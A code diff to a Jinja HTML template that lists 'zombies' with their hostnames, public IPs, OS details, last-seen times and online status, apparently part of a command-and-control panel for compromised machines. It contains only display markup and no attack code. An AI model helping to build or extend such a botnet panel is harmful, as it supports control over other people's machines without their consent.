@@ -25,7 +25,12 @@
   {% with legend='last seen' %}
     {% include 'objects/tables/headers/datetime.html' %}
   {% endwith %}
+
   <th><span class="emoji">  </span><span class="text">on</span></th>
+
+  {% if not brief %}
+    <th><span class="emoji">📖  </span></th>
+  {% endif %}
 
 
 {% endif %}
@@ -37,21 +42,36 @@
 {% if data %}
 
 {% for row in data %}
+
   <tr>
+
 
     <td>{% include 'objects/forms/inputs/data-checkbox.html' %}</td>
 
 <!--    <td>{{ row['username'] }}</td>-->
+
+
     <td>zombie{{ row['id'] }}</td>
 
     {% if not brief %}
-      <td>{{ row['current_hostname'] }}</td>
+      <td>
+        {{ row['current_hostname'] }}
+      </td>
     {% endif %}
 
     <td>
-      {% with os=row['os'].lower() %}
-        {% include 'objects/dynamic/os_icon.html' %}
-      {% endwith %}
+      {% if row['sysinfo'] %}
+        <a class="tooltip" href="javascript:;">
+          <span class="os-icon">
+            {% with os=row['sysinfo']['os'].lower() %}
+              {% include 'objects/dynamic/os_icon.html' %}
+            {% endwith %}
+          </span>
+          <span class="tooltip">
+            {{ row['sysinfo']['os_details'] }}
+          </span>
+        </a>
+      {% endif %}
     </td>
 
     <td>{{ row['current_public_ip'] }}</td>
@@ -81,9 +101,16 @@
       <td><span class="emoji">🔴  </span></td>
     {% endif %}
 
-
+    {% if not brief %}
+    <td>
+      <a class="link-undecorated" href="{{ url_for('members_bp.zombies', zid=row['id']) }}">
+        <span class="icon">📜  </span>
+      </a>
+    </td>
+    {% endif %}
 
   </tr>
+
 {% endfor %}
 
 
